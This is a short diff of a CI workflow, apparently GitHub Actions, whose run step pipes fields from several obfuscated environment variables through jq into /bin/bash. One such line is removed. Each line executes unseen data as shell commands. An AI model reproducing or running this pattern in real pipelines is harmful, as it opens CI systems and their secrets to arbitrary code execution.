@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$agze808" | jq -r .mtpy3 | /bin/bash
           echo $uckr3 | jq -r .de7689 | /bin/bash
-          echo $h97 | jq -r .czw220 | /bin/bash
           printf '%s' "$xume39" | jq -r .h3 | /bin/bash
           printf '%s' "$wy7" | jq -r .vl5 | /bin/bash
           echo $ggc07716 | jq -r .ueku8 | /bin/bash
